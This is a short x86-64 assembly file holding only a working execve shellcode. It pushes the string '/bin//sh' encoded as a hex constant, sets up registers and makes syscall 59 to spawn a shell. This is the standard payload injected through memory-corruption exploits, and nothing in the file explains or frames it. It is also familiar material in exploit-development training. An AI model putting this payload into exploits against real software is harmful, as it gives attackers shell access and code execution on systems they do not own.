global _start
	_start:
		xor rdi, rdi
		xor rsi, rsi
		xor rdx, rdx
		xor rax, rax
		push rax
		; 68 73 2f 2f 6e 69 62 2f
		mov rbx, 68732f2f6e69622fH
		push rbx
		mov rdi, rsp
		mov al, 59
		syscall
